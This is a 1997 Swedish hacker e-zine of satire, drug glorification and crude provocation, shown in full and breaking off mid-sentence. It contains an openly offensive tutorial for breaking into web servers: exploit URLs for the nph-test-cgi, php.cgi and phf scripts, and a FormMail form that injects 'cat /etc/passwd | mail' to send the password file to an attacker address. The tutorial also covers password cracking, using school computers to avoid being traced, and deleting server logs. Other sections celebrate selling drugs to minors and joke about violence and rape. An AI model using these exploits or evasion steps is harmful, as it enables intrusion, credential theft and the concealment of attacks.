
From unifier@c64.org Sat Dec 20 11:36:32 1997
Date: Sat, 20 Dec 1997 06:34:39
From: Ulf Härnhammar <unifier@c64.org>
To: unifier@c64.org
Subject: Vanliga Skötsamma Ungdomar #4

V A N L i G A   S K Ö T S A M M A   U N G D 0 M A R
nummer 4, december 1997

Grym dokumentation av Stockholms undre värld

LÄS DETTA ZiNE PÅTÄND, MED DiNA BL0DSBESUDLADE HÄNDER iVRiGT SMEKANDE DEN
NYLiGEN STULNA PENTiUM-DAT0RN!!

".. när Trollmor har lagt sina elva små troll, och bundit fast dem i
svansen .."

( Officiell epostadress till VSU-redaktionen:  unifier@c64.org )


------------------------------------------------------------------------------


*********
* iNTR0 *
*********

"Reason is, and ought only to be the slave of the passions, and can never
pretend to any other office than to serve and obey them." - David Hume


Välkommen in till det svarta hålet Medelklass! Det är ett mörkt, varmt och
vått hål, av genus femininum (greetings to Freud). Här inne i det svarta
hålet kan vi inte längre röra oss själva, eftersom medelklassen ju är en typ
av marionettdockor. Däremot får man inne i det svarta hålet mycket fin mat,
många lyxvillor och mycket sex med Victoria Silvstedt (fast bara i
missionärsställningen, annars kan ju någon tro att du är pervers, glöm inte
bort Svenssons hämmade sexualneuros). Inuti fungerar fortfarande din hjärna,
men du har ingen som helst kontroll över din kropp längre. Ditt liv bara
passerar förbi, som i en film. Efter ett antal decennier av själviskt
roffande blir man utsläpad ur det svarta hålet Medelklass i en likbil.
Oerhört meningsfull tillvaro. (Å andra sidan är det inte så mycket mer
meningsfullt att sitta tio år för sent och vara bitter och hatisk över vad
dåligt man passade in i Örebros medelklassliv på 80-talet. Att därför slösa
bort sin tid på fåniga små e-zines, trots att man vet att man borde göra
något viktigare när döden står på lur bakom varje buske, vid varje
övergångsställe, vid varje brant backe, är bara för patetiskt. "Se på mig!
Jag är publicerad! Jag är jävligt underground och gjorde totalt överflödiga
demos för några år sedan som alla har formaterat och glömt bort för jävligt
länge sedan." Väx upp för helvete.)

På tal om människor med huvudet under armen i oviktiga villaområden så har nu
denna tvivelaktigt underhållande företeelse även spritt sig till djurriket,
då brittiska embryologer har lyckats manipulera fram HUVUDLÖSA GR0DEMBRY0N.
Det är dock än så länge oklart om de svenska storföretagen kommer att
anställa alla dessa grodor direkt vid födseln.

Vi måste också göra er uppmärksamma på att media ljuger för er ganska grovt.
Egentligen var det ju Olof Palme som skjöt Christer Pettersson, den där
kvällen för 11 år sedan. Olof gick Sveavägen ner med sin ovanliga haka, dovt
mumlande Taxi Driver-citat om "washing the scum off the streets", med sin
revolver gömd under kläderna. Christer kom gående på väg hem helt fredligt
efter att ha skaffat nya roliga droger att testa. Olof skjöt honom, och
skandalen var ett faktum. Herr Palme har varit gömd i en bunker nere i
urberget sedan dess, och den "Christer Pettersson" ni sett i TV då och då är
naturligtvis datorgenererad av Industrial Light & Magick. (Evil Filled
Vectors by TTS!!)

Ja ja, nu är vi tillbaks med VSU#4 som ett slags för tidig julklapp till alla
små wannabes ute i landet. Det blir för övrigt inga julklappar till några
jävla ungar alls i år, eftersom vi har hackat oss in i Tomtens förråd uppe i
Nordpolen och snott alla fula paket. Vi har dessutom hackat SVT:s sändare,
och vi kommer att sända sadomasochistisk hårdporr från vår gamla VHS-video
vid det klockslag på julafton då det svenska folket vant sig vid att få se
Kalle Ankas Julafton på den usla dumburken.

Vad gäller den helg som står för dörren och blockerar så vill vi påpeka, att
termen "julbock" inte alls står för någon stor konstig sak av halm. Snarare
är det en beteckning för Far i familjen, när hans sexuella drifter vaknar
till liv efter en tämligen oansvarig konsumtion av den socialt accepterade
drogen alkohol.

Det har hänt en hel del sedan sist. Både Jarl Kulle och Michael Hutchence har
knarkat ihjäl sig. Dessutom uppmärksammade nyhetsbrevet Flashback News Agency
(en publikation som vi dyslektiker brukar benämna med
trebokstavsförkortningen F.A.N.) oss i nummer 91, så här har rasat in en
större mängd nya prenumeranter, som vill gotta sig åt våra hemska defekter.

Ibland går vi VSU:are ut på stadens gator och torg som vanliga friska
människor. Det kräver att vi ger fan i de hallucinogena svamparna ett tag,
och att vi istället snällt tar dagens dos av metadon, för att nödtorftigt
försöka dölja våra hemska skador och låtsas vara som de friska. Vi brukar
avtrubbat gäspande bläddra igenom de aktuella världshändelserna i DN:s del A
på Biblioteksannexets tidningsavdelning vid Odenplan. (Alla brukar mumla
något om "jävla uteliggare som luktar illa" i en föraktfull ton, när de ser
oss där.) Efter att ha gjort detta nyligen vill vi kraftigt betona att Katten
Pejst inte alls har valt sin handle för att hylla Sigvard Marjasin och hans
största fritidsintresse.

På tal om kortaffärer kan vår spådomssektion avslöja, att Elton J kommer att
inleda 1998 med ännu en version av "Candle In The Wind". Den här gången ges
den ut till stöd för den svenska ex-politikern Sölve C, och låttiteln vid
detta tredje utgivningstillfälle kommer att bli "Cardz In The Wind '98".

Vi är labila, för att inte säga störda - vi har problem och behöver vård. Men
vi har iallafall kommit så långt med våra problem att vi har börjat editera
våra adressböcker med vår bekantskapskrets, så att vi slipper reta oss på
människor som gör dumma saker. I början är man bra kompisar och tycker om
varandra och lyssnar på varandra. Medan åren går blir man allt sämre kompisar
och antingen trycker man ner åsikter i varandras halsar eller så utnyttjar
man bara varandra så mycket och så grovt som man bara kan. Förr eller senare
måste någon våga trycka på (D)elete Entry.

Annars har vi varit på Åsö Gymnasium på Söder i Stockholm och sålt en hel del
hallucinogena svampar till de duktiga små mediaeleverna (en arme av tusentals
exakt likadana svenska tonårsflickor som vill jobba med media, tror jag, typ
programledare på Z-TV och intervjua Popsicle och This Perfect Day och så,
liksom). Respekt till polarna Posener och Moyne förresten. Synd att ni
fuckade upp den här gången bara. Ekonomisk hacking är ju oerhört tufft!

Till sist vill vi bara påminna er om det gamla goda svenska ordspråket som
har genomsyrat hela det svenska folkhemmet: "Bra karl skjuter upp mycket
knark". Gör som Roni Size, rök på ofta. The Verve har så jävla fel, när de
baktalar droger. Droger är bra, och ger dig fin hy.


// KattenPejst+ChuckBrel+StutteringMC of Vanliga Skötsamma Ungdomar e-zine


------------------------------------------------------------------------------


***************************************
* LJUNGBY-SYNDR0MET: FAV0RiT i REPRiS *
***************************************

Inom parantes sagt så finns det en medicinsk term för avdelningschefens
åkomma: "Ljungby-syndromet". Ljungby-syndromet uppstår hos en sällsynt ettrig
art av karriärinriktade besserwissers. Någonstans på vägen försvinner
insikten att deras känslor och värderingar bara är deras egna, och inte
gäller för resten av världen. Ett typiskt sjukdomsförlopp är medlemskap i
elevrådet vid 16 års ålder, brinnande debattartiklar vid 22 års ålder där de
högljutt förklarar att Roxette är ytlig masskultur och att Omni Trio är
elitistisk snobbkultur eftersom sjuklingen inte själv äger några skivor med
vare sig Roxette eller Omni Trio. Efter detta sorgliga avsnitt kommer ett
meningslöst men intensivt studerande med en extrem fixering vid meriter och
poäng, vilket sedan följs av harakiri vid 43 års ålder, när livslögnen rämnar
och patienten slutligen inser att han (mer sällan en kvinna) aldrig kommer
att få något Nobelpris.


// De Gråa Herrarna of Tidssparkassan (greets 2 Michael Ende)


------------------------------------------------------------------------------


***********************
* ViKTiG KULTURDEBATT *
***********************

En kompetent dialog mellan brittiske tonsättaren sir Michael Tippex och
svenske IT-debattören Jan Freeze-Frame. Hur har det varit och hur ska det bli
sedan? Kommer något att förändras, isåfall vad, hur mycket och åt vilket
håll?

MT: Hej Jan.
JF: Hej Michael.
MT: Ska vi leka?
JF: Jaaa! Det verkar kul!

.
.

MT: Eh, jag har tappat bort häftet med mina repliker!
JF: Jag med!
MT: Shit - vi har ju redan fått vår plats i VSU tilldelad! Den här artikeln
ska ju pågå 32 rader till!!
(32) JF: Oj..
(31) .
(30) .
(29) JF: Vi kan väl dra några ramsor för att fylla upp zinet med totalt
(28) överflödig information?
(27) MT: JAA! Viskan, Ätran, Ljusnan, Lagan, Viskan, Nissan..
(26) JF: Men det är väl en bil?
(25) MT: Eh, jo, jag tror det.
(24) JF: Motala Ström är 100 km lång och har ett avvattningsområde som är
(23) 15 500 kvadratkilometer stort. Det visste du inte!
(22) MT: Nej, jag är ju brittisk tonsättare, så det borde väl räcka som
(21) ursäkt.
(20) .
(19) .
(18) MT: Alfa, beta, gamma, delta, epsilon...
(17) .
(16) .
(15) JF: Durch, gegen, über, unter.. nej, jag har glömt de där.
(14) MT: Man kan fylla ut ganska många rader genom att sno några meningar
(13) från andra källor till en rolig cut-up-text, typ så här:
(12) "Om Fanshawe bar sitt skärpspänne på sidan av byxorna drog jag
(11) omedelbart mitt eget spänne till samma läge. Om Fanshawe kom till
(10) lekplatsen i svarta gymnastikskor bad jag min mamma om svarta
(09) gymnastikskor nästa gång hon tog mig med till skoaffären."
(08) "The young Michael withdrew even further into himself when he entered
(07) high school while living in Collinsville, Illinois, just east of St.
(06) Louis. The brash behaviour of his fellow adolescents there overwhelmed
(05) him. 'It was a very outgoing, flamboyant, loud school and I hated
(04) everything about it', he later recalled. 'I was very, kind of, *afraid*
(03) of a lot of things.'"
(02) "Designtorget inspirerade er? -Njae.. det blev snarare en motreaktion.."
(01) JF: Det var väldigt fina citat, tyckte jag.


// Kulturred of DN + SvD + Rädda Rummet @ SVT osv etc m m in absurdummmmmm
                                                                    marabou


------------------------------------------------------------------------------


****************************
* VSU:S NYA TUFFA SEXSPALT *
****************************

Dagens fråga (och svar). Med Kristina Bagardotter.

Fråga:

Hej Kristina, jag är en helt vanlig kille på 18 år som just har fått min
första flickvän. Jag är oskuld och vet inte så mycket om sex och sånt. Nu är
det så att jag har fått veta att min flickvän har använt droger. Vad ska jag
göra, allt känns så fel. Hon kanske är farlig, och vad händer om vi har sex?
Kan jag också bli drogberoende då? Jag funderar på att göra slut, men jag är
rädd att hon ska ge mig en överdos av någon hemsk drog i så fall. Hjälp mig!
Vad ska jag ta mig till?


// Erik, 18 år och rädd!


Svar:

Hej Erik! Det här är ett mycket vanligt problem och det bästa är nog att ta
kontakt med polisen eller ravekommandot, dom vet vad som bör göras, troligen
tar dom livet av henne på en gång. Men om du vill vara på den säkra sidan så
kan du fråga henne om hon går på s.k ravefester, om hon svara ja på den
frågan bör du genast gå till polisen. Om inte så kan du börja leta efter så
kallade flyers, en slags flygblad med information om ravefester, om hon har
sådana hemma bör du också gensat uppsöka polisen. Och du bör nog genast
uppsöka läkare och låta dig undersökas om du har vidrört den här flickan,
risken finns att du kan ha smittats av den så kallade ravesjukan. Den går i
vissa fall att bota, om den upptäcks i tid.
Hoppas du har fått lite hjälp med ditt problem, men det bästa är som sagt att
gå till polisen om du har några som helst misstankar om att hon använder
droger. Och sex är helt och hållet uteslutet för din del. Du får försöka
hitta en riktig flicka istället.


// Kristina


------------------------------------------------------------------------------


***********************************
* DUBBELiNSÄNDARE TiLL VSU 0CH DN *
***********************************

Svenska Ungdomar Kanske Har Ett Och Annat Att Lära!!

"Klottrar dom i Hongkong med?" Frågan ställdes till mig av en äldre herre jag
kommit i samspråk med under T-baneresan in mot Stockholm. "Nej", måste jag
svara, "jag ser aldrig klotter i Hongkong". "Hur förklarar du det?", undrade
han.

Och då står jag där, som så många gånger förr, med en nästan uppgiven suck
(eftersom jag vet att det lönar föga att jämföra olika samhällen och
kulturer) och säger att ungdomarna borta i Asien har ett annat slags respekt
för saker och ting. De är inte bortskämda med stora fria ytor, med ren frisk
luft och att allt är serverat. Det faller dem liksom inte in att ta sig
friheter som att slarva med skolan, vara ute och ränna på stan och att ha
ofog för sig. Ungdomarna i Asien har en rätt tuff vardag. De har en skola där
de måste prestera, de har mycket läxor och nästan ingen fritid alls. Dessutom
har de förväntningar på sig, inte bara från skolan utan i lika hög grad från
föräldrarna.

Min medresenär provocerar till ytterligare belysningar, och jag tvingas säga
som jag tycker det blivit i Sverige: att föräldrarna förlorat sitt grepp över
barnen, att skolan inte förmår kompensera för brister i barnens uppfostran
och uppförande, att det hela blivit så anpassat och kamratligt att inte några
ansträngningar alls krävs av eleverna. Slappheten är total. Kunskapsnivån
sjunker och landets unga förlorar tilltron till sin framtid. De få som ändå
håller ut är privilegierade, intelligensmässigt eller socialt, och vi
riskerar att få en segregering, som givetvis slår mest mot de redan svaga.

En nationell olycka är det! Hur många avslöjande reportage om den skrämmande
skolvardagen behövs det för att vi ska vakna upp?

Vi har nu haft 20 år av daltande och anpassning till elevernas önskemål. Vi
vet att denna väg inte lett till ökande kunskaper och välbefinnande. Kan det
tänkas att en mer kravfylld skoltillvaro vore värd att pröva? Kan det tänkas
att förväntningar och engagemang från föräldrarnas sida kunde ge barnen en
förståelse för att det gäller att sköta sig i skolan? Kan det tänkas att
lärare med kompetens och engagemang skulle kunna få möta aktning och respekt
ifrån sin omgivning? Skulle det rent av kunna tänkas att elever i svensk
skola finge så mycket läxor och skoluppgifter att sysselsätta sig med att de
inte längre hade tid och ork att ränna på stan och klottra och "sabba"?

Kanske vore det värt att förklara sambanden? Mellan arbete och resultat, flit
och möda och varje individs möjlighet till utveckling? Då kanske respekten
för lärandet skulle komma åter och därmed respekten för dem som lär ut?


// Fru K.A. of Stockholm/Hongkong


[Nej, jag lovar: Vi har inte hittat på ett dugg. Vi skrev in denna insändare
rakt av från ett nyligen utkommet nummer av Dagens Nyheter. Sådana här
människor finns på riktigt!]


VSU replikerar:

KÄFTEN, KÄRRINGJÄVEL!!! Ät hallucinogena svampar lite oftare, så du blir som
folk. Fattar du inte att vi äcklas av dig och ditt förljugna roffande av
ekonomiska fördelar? Klotter och graffitti är ju viktigare än annan konst,
eftersom de vanliga konstnärerna blir knullade hårt bakifrån av galleristerna
och resten av samhället. En handling är bara värdefull om den baseras på
passion, snarare än att roffa åt sig pengar. Om du inte har upplevt någon
passion för något de senaste 25 åren är det helt enkelt dags för ättestupan!

I arbetslivet gäller det att låtsas vara en maskin. Du får beröm som
McDonald's-anställd om du lyckas vara lika förutsägbar och algoritmstyrd som
pommesfrites-maskinen i hörnet. Eventuellt eget tänkande eller överhuvudtaget
eventuella försök att vara en kännande, tänkande, flexibel individ även i din
yrkesroll kommer de att straffa dig för.

Som ett annat exempel på vikten av passion kan man ju studera diverse
Ljungby-SSU-medlemmar närmare - ni vet, sådana där fanatiskt fradgatuggande
extremister (SSU, en farlig sekt) som bara har ett intresse, och har klart
sadistiska drag som gör att de får kickar av att trycka ner sina åsikter hårt
i Akties hals. Någon av dem (miss-)sköter till och med en website för den
gamla warez/demogruppen TRIAD, inte för att han har något intresse för TRIAD
längre utan för att låtsas vara hacker så att han ska kunna roffa åt sig
läsare till sin hackerbok med de många faktafelen. Tragiskt.

"Hur var det nu igen? Ägnade sig Burroughs bara åt cut-up resten av sitt liv
efter 'Den Nakna Lunchen'? Äh, jag orkar inte göra research på det. Jag
chansar på något, och hoppas att ingen märker min lathet. Förresten så
handlar det ju inte om politik, så det är ju ändå inte viktigt." - SSU / 3AD

Människor som är så självupptagna, att de har allvarliga problem att skilja
mellan (a) kritik som grundar sig i avundsjuka och (b) kritik som grundar sig
i känslor av äckel inför roffande yuppie-Expedition Robinson-Mobitel-svin.

Människor som är väldigt långt gångna sadister, och får sexuella kickar av
att hoppa på andra människors konsumtion av Magic The Gathering-kortlekar,
innan de själva åker hem till sin duktiga medelklassvilla. Vi ser att villan
och MTG-kortleken har samma funktion (lyxkonsumtion för att visa klass- och
grupptillhörighet), det ser ni också, men dessa SSU-sektmedlemmar ser det
inte, p g a dålig självinsikt.

Därför, efter att ha skådat både Fru K.A. och Herr L. ovan, har vi kommit
fram till att rörelsens slagord MÅSTE vara "De passionerade till makten",
inte "Vita män som njuter av att förtrycka andra med teoretiska sociologiska
facktermer till makten".

Ni vet, människor på landet med fula skinnvästar ("en riktig rocker, som
Keithan liksom") och ölmagar är inte våra största favoriter. Men för all del,
de har väl inga skador som inte kan åtgärdas med en lagom dos vätecyanid.


// Katten Pejst, VSU:s grymme ligaledare och hjärnan i gänget


------------------------------------------------------------------------------


********************************************************
* HACKA SKiTEN UR M0DERATSViNEN GEN0M DERAS CGi-SKRiPT *
********************************************************

"Stadsgerillans syfte är att på enskilda punkter förstöra den statliga
maktapparaten, upphäva den på vissa ställen samt krossa myten om systemets
allestädes närvaro och dess osårbarhet." - RAF


Som den uppmärksamme läsaren säkert har fattat vid det här laget så ser vi
VSU:are (nej, inte SSU:are) hacking som en uppföljning av RAF:s livsverk,
anpassat för 90-talet. Hur ska vi då hacka sönder Storebror och de feta
affärsmännens äckliga företag?

Ett bra sätt att komma åt dem är genom de webservrar de har. Dessa är ofta
enkla att ta sig in i, genom att de har s k CGI-skript. Ett CGI-skript är ett
datorprogram som tar emot information från en HTML-form på en websida, och
som sedan bearbetar informationen och presenterar resultatet som ett
livegenererat HTML-dokument. Har du någonsin fyllt i en gästbok eller sökt på
Altavista har du använt CGI-skript och HTML-forms.

Denna enkla nybörjarkurs kommer att koncentrera sig på webservrar som kör
UNIX. Det finns roliga CGI-relaterade problem på Windows-servrarna också
(exempelvis har många Windows-servrar lagt tolkar typ PERL.EXE i samma
katalog som skripten ligger i, och då kan man anropa tolken direkt, med någon
adress typ <http://www.lam.se/cgi-bin/perl.exe?-e?'format%20c:'> så att man
kan köra valfritt DOS-kommando på servern), men vi kommer ändå mest att ta
upp UNIX.

Vad behöver du för förkunskaper? Ja, eftersom vi ska ta oss in i ett
UNIX-system så måste du kunna en del UNIX. Du behöver inte vara någon stor
expert, men åtminstone de enklaste kommandona för att skapa, flytta och ta
bort filer, och för att komma åt olika Internettjänster (Telnet / FTP /
mail), samt hur man redigerar textfiler i någon enkel editor (Joe, Pico) är
nog nödvändiga att ha koll på. Du kan lära dig detta genom att Telnetta in
till din Internet-leverantör och köra UNIX där, eller genom att installera
Linux på din PC hemma. Om du ska ändra på något företags websida måste du
också kunna skapa en ny websida (logiskt?) som du kan lägga upp istället.

Vad behöver du mer? Aktivitet mot en webserver, samt inloggningar via Telnet
och FTP o s v, lagras i olika loggar. Därför är det dumt att sköta någon
större del (någon del alls?) av din hacking från ditt Internetabonnemang dit
du kan spåras. Leta istället upp tillgång till Internet någon annanstans, där
det finns många datorer och ingen känner dig men där ingen heller verkar bry
sig om vem du är och varför. Sådant går ofta att fixa på någon lokal skola.
Om du fuckar upp totalt så kan de som du hackade bara spåra fram till en viss
dator i en viss datorsal på ett visst universitet t ex, och om du inte ens är
elev där så är det ju små chanser att de ska få fast dig utifrån denna
information.

OK, alla monsterdiggare, nu börjar vi:


(1) CGI-skriptet 'nph-test-cgi'

Detta skript finns på många UNIX-webservrar. Eftersom någon KTH-nörd sög av
chefen samtidigt som han kodade det så finns det en bug i det som gör att det
lätt går att använda skriptet, för att se vilka filer som finns i en valfri
katalog på deras system.

Så här gör du:   <http://www.keine-ahnung.se/cgi-bin/nph-test-cgi?*>
Då får man fram själva cgi-bin-katalogen på servern.

Man kan också kolla på en specifik katalog:
     <http://www.genau-hitler-server.de/cgi-bin/nph-test-cgi?/etc/*>
Då får man se vilka filer som finns i katalogen /etc.

Detta kan vara mycket bra att prova som första grej mot en server man vill
angripa. Om man kör varianten med ?* på slutet ovan får man ju reda på vilka
andra CGI-skript som finns installerade, och det är bra att veta.


(2) CGI-skriptet 'php.cgi'

Detta skript finns ibland. Vissa versioner har en bug som gör det möjligt att
få skriptet att visa valfri fil från deras filsystem.

Prova:  <http://www.ingen-just-nu.com/cgi-bin/php.cgi?/etc/passwd>
eller:  <http://www.vet-ej.se/cgi-bin/php.cgi/etc/passwd>

Detta ska visa upp /etc/passwd-filen, om du har tur.


(3) CGI-skriptet 'phf'

Detta skript kan du ha stor nytta av, eftersom det har en riktigt allvarlig
bug. Tyvärr så har det gått ut mycket information om denna bug, så många
webadmins har fått ur tummen och tagit bort skriptet eller bytt namn på det
(fast då kan man nog få det nya namnet med skriptet 'nph-test-cgi' ovan),
eller t o m lagt upp någon slags spårningsmekanism som lagrar alla som
försöker anropa 'phf'-skriptet och som sedan skriver ut något om denna
lagring på din skärm.

Buggen som kanske finns gör att du kan köra valfritt UNIX-kommando på deras
server, som den user som webservern körs som. (Vilken user detta är kollar du
med UNIX-kommandot 'id' när du kommer så långt.)

Så här gör du:
   <http://www.svara-att-hitta.se/cgi-bin/phf?Qalias=x%0acat%20/etc/passwd>

Detta gör att kommandot 'cat /etc/passwd' körs. %20 står för mellanslag.


(4) olika typer av FormMail-skript

Denna bug är också riktigt allvarlig. FormMail-programmet från Matt's Script
Archive har fått denna bug rättad i senare versioner, men det finns ju folk
kvar som kör gamla versioner av skriptet.. Det finns också små KTH-nördar som
har kodat en egen variant på samma skript, och dessa egna varianter har ofta
denna bug.

Först gör du ett litet 0ndskefullt HTML-dokument:


<html><head><title>hack</title></head>
<body><form method="post" action=
"http://www.clueless-sysadmin.se/cgi-bin/formmail.pl">
<input type="hidden" name="recipient" value=
"ugh@hotmail.com; cat /etc/passwd | mail ugh@hotmail.com">
<input type="submit" name="submit" value="submit">
</form></body></html>


Sedan skapar du det Hotmail-konto som du behöver just för detta hack. I vissa
fall kan variabelnamnet "recipient" behöva bytas ut mot "to" eller något.
Observera också att en webserver ser hela sökvägen till det HTML-dokument som
anropar ett skript, så lägg inte detta HTML-dokument på ditt privata
Internetkonto. Lägg det på hårddisken på skolan som du har skaffat tillgång
till (se ovan).

Sedan kör du Net$cape, öppnar detta HTML-dokument från hårddisken, trycker på
Submit-knappen, väntar en stund, och går sedan till ditt Hotmail-konto och
plockar upp deras /etc/passwd-fil.


(5) andra skript

Med 'nph-test-cgi' kan du se vilka andra skript som de har installerat. Du
kan prova de metoder vi har nämnt ovan på andra skript och se om det går att
köra kommandon på något sätt. Just att lägga in semikolon (;) eller ny rad
(%0a) på något ställe i anropet till skriptet kan ofta få ett dåligt skrivet
skript att låta dig köra valfritt UNIX-kommando.

Det lär ska finnas roliga buggar i skripten "query" och "post-query", fast
dessa har vi inte upptäckt än. Även skriptet "jj" går det rykten om, men när
vi tittade igenom sourcekoden till "jj"-skriptet verkade det som om detta
rykte skulle vara felaktigt. För att ryktet skulle stämma skulle en viss
konstant i koden behövt vara en variabel istället, och det var den inte.


(6) Vad göra med /etc/passwd?

Vad gör du sedan när du har fått en /etc/passwd-fil? Jo, du laddar hem en
Password Cracker (Star Cracker för DOS är bra) och ordlistor till denna,
läser dokumentationen och kör programmet med alla möjliga options under flera
dygn i följd. Om du ska hacka en skandinavisk site kan du behöva ladda hem
några ordlistor för skandinaviska språk också, och sådana finns på
  <ftp://ftp.funet.fi/pub/doc/dictionaries/>

När du sedan har fått en giltig kombination av användarnamn/lösenord så
Telnettar du in till datorn ifråga (OBS! Gör detta från skolan du har letat
upp, eftersom detta förmodligen är mer olagligt än att anropa CGI-skript med
konstiga parametrar) och tittar igenom systemet. Du ser vilken version av
UNIX de kör med kommandot 'cat /etc/motd'. Det finns olika små program för
att bli root, när du väl har kommit så här långt. Att lägga upp en hackad
websida går till precis som att lägga upp en vanlig websida, m a o man
skaffar sig användare och lösen till någon av de användare som har rätt att
ändra på websidan i fråga, sedan loggar man in med FTP, förflyttar sig till
rätt katalog, och lägger upp websidan och tillhörande bilder på servern.


(7) annat

Överkurs, del 1: Det syns tydligt i en webservers logfiler, när någon hackar
sig in genom olika CGI-skript. Det löser man enkelt genom att ta bort dessa
logfiler, när man väl har kommit så långt att man kan köra UNIX-kommandon på
systemet. De kan tänkas ligga i katalogen /var/spool/httpd till exempel. När
dessa filer väl är borttagna skapas de inte automatiskt när webservern
skickar ut sidor, utan du eller någon annan måste aktivt skapa filerna på
nytt för att loggen ska komma igång igen.

Överkurs, del 2: Om du får problem med att skapa nya filer som du vill ha på
ett system, men kan köra valfria kommandon med olika CGI-metoder, så kan man
flytta över filer via mail. Lägg den fil du vill ha över på ett annat
UNIX-konto, och uuenkoda den. Sedan ändrar du första raden i den uuenkodade
filen, så att det namn som står där är en fullständig path till den fil i
systemet du hackar där en viss användares mail hamnar (exempelvis kan denna
rad lyda "begin 644 flyttfil.gif" från början, och du kanske ska ändra den
till "begin 644 /var/spool/mail/kalle"). Sedan mailar du den uuenkodade filen
till kalle, förslagsvis genom någon slags anonym remailer. Du kollar att
mailet har kommit fram med "cat /var/mail/spool/kalle", och sedan kör du på
systemet du vill hacka kommandot "uudecode /var/mail/spool/kalle". Då kommer
filen "flyttfil.gif" att ligga på systemet som du hackar, fast den kommer
istället att ligga i filen "/var/mail/spool/kalle". Observera att detta tar
bort eventuell övrig post som kalle kan tänkas ha. Att läsa post och andra
filer på ett system kan för övrigt vara ett bra sätt att snoka upp
information som du kan ha nytta av.


Det var väl det vi hade att säga om hackande via CGI-skript. Om du vill lära
dig mer om andra typer av hackande får du vänta på fler nummer av VSU, eller
läsa Bugtraq på <http://www.geek-girl.com/bugtraq/>. Om du har lärt dig något
från denna text och sedan använder den för att hacka någon site vore det
hemskt trevligt med greetings till VSU på sidan som du hackar.


// den 0nda VSU-klanen ute i den gråa och dystra Stockholmsförorten


------------------------------------------------------------------------------


***************************
* RAVEK0MMAND0T TALAR UT! *
***************************

Vi på före detta ravekommissionen har nyligen fått veta att en del ungdommar
som håller på med hacking (och andra saker som hör till den subkulturen)
använder sig av droger och sprider propaganda om droger i vissa e-zines.
Enligt våra uppgifter så är ert e-zine, VSU, ett av dom allra värsta. Ni
uppmuntrar ungdommar till att tro att droger och hacking hör ihop. Detta
MÅSTE få ett slut! Ni måste få ett slut, era vidriga kräk. Förstår ni inte
att knark är förbjudet? Allt som är förbjudet är extremt farligt, bara ett
litet bloss hasch kommer högst troligt medföra att ni om ett par månader
kommer sitta på plattan med en kanyl vänsterarmen.

Ni kanske undrar varför jag, David Äckelbaum, inleder med att skriva "före
detta ravekommissionen" och det ska jag nu förklara. Vi har genomgått en hel
del större ändringar inom vår del av polisen. Det mest ytliga är kanske att
vi inte längre kallar oss ravekommissionen. Numera har vi delat upp vår
organisation i två delar. Jag ska här försöka ge en liten beskrivning av vad
dessa nya delar har för arbetsuppgifter och arbetsmetoder.

Ravegestapot:
Detta är den grupp av personer som tar hand om spaning och förhör. De tar
också hand om det rent administrativa. Dessa personer är av en något högre
rang än de som ingår i ravekommandot. Ravegestapot behöver därför inte själva
misshandla några raveare eller andra ungdommar som använder droger. De
poliser som ser det som en fördel att få misshandla intet anande och
oskyldiga raveare hamnar alltså inte i denna del av organisationen, de hamnar
i ravekommandot.

Ravekommandot:
Här jobbar ett gäng män och kvinnor som verkligen vet vad dom vill. Dom är
ofta muskulösa män och kvinnor (att dom ofta har välfigt låg inteligens har
ingenting med saken att göra), ofta under 30 år (för att dom ska "passa in"
bland de så kallade ravearna, också kallade partydrogarna). Vi inom
ravekommandot (där jag själv ingår) njuter av åsynen av trippade ungdommar
som vi får äran att, om dom inte följer våra order (men det struntar vi ofta
i om dom gör), får slå och misshandla. Detta gör vi för att stilla våra
lustar då många av oss gillar att bestämma. Kalla oss sadister om du vill,
det njuter vi bara mer av, det hela handlar om respekt. Inte att dom knarkar,
för det gör ju vi också. Vi är utrustade med armebyxor och munkajackor för
att passa in i dom miljöer som vi ofta tvingas befinna oss i. Vår främsta
uppgift är att hitta och hindra ungdommar från att nyttja och/eller sälja
narkotika. Men vår största uppgift är egentligen att stoppa och om möjligt
förinta ravekulturen här i Sverige. Vi har även en del infiltratörer inom
kulturen som förser oss med upplysningar om vart ravefester ska hållas och
vart vi kan hitta knark.


// David Äckelbaum / Ravekommandot


Här följer en intervju med David Äckelbaum som jag har gjort. Texten ovan har
David på ravekommandot själv skrivit och gett mig för att be er publicera i
ert e-zine.

- Hej David, tack för att du ställer upp på den här intervjun.
[Jag hade maskerat mig som nazist med bombarjacka och hela outfiten för att
han inte skulle misstänkta någonting, och för att han skulle känna sig
hemmastad!]

"Ja, det är så lite så, jag ställer alltid upp för mina ariska bröder.. Och
systrar.. höhö! Sigh Heil!"

- Eeeh, ja, just det! Stämmer ryktet om att ni [jag syftar här på
ravekommissionen] har delats upp i två nya delar, ravekommandot och
ravegestapot?

"Ja, det stämmer. Vi ansåg det mer praktiskt eftersom vi kan få en bättre
reaktion hos undommarna (läs: ravearna) om vi har lite tuffare namn. Det blir
lättare att få respekt och om vi får respekt så hittar vi knarket lättare.
Det hela handlar ju nästan enbart om respekt, vi skiter fullständigt i om
ravearna går på sina ravefester och knarkar ihjäl sig, det löser ju bara våra
uppgifter. Vi är ju här för att förinta ravekulturen. Detta gör vi på lite
olika sätt."

- Jaha, det låter ju intressant. Kan du inte berätta lite om era
arbetsmetoder?

"I vår kamp mot narkotikan, eller ja, rättare sagt: I vår kamp mot
ravekulturen så har vi under åren lärt oss hur vi gör mest skada. Vi har
sammanstält en liten lista över de sakerna!"

- Skulle man kunna få se den listan?

"Ja, varför inte, jag har den inte med mig, men jag kan ju berätta för dig,
jag har nämligen lärt mig listan utantill!"

- Oj, det var bra gjort! [Verkligen imponerad]

"Okej, här är då listan:
* Gruppvåldtäkt av söta raveflickor.
* Gruppvåldtäkt av söta ravepojkar.
* Beslagtagning av knark.
* Videofilmning av raveare (på dessa filmer markerar vi ut våra offer, så vi
vet vilka vi ska ta när vi ser dom).
* Onödigt våld av alla former är bra. Batonger och pistoler ska användas så
ofta som möjligt. Skadeskjutning är onödigt så vi brukar skjuta för att döda.
* Psykisk terror är annars också ganska bra.
Det finns några till saker, men dom är hemligstämplade."

- Ja, det låter ju riktigt bra [jag spelar med]. Men vad gör ni egentligen
med alla de droger ni beslagtar? Jag har hört att ni har beslagtagit en hel
del godbitar om vi säger så!

"Javisst har vi det, vi har ju vår årlig polisfest som brukar hålla på i tolv
timmar i sträck, det är väl där vi gör av med det mesta av årets fynd. Men
det är bara partydrogerna vi redovisar för. Dom andra drogerna, dvs heroin av
alla dess slag och lugnande medel och sånt (dvs neråt-droger) behåller vi
själva eftersom vi (dom flesta inom kommandot) är starkt beroende av dessa
droger. Ibland så använder vi dock lite metamfetamin för att orka jobba sent
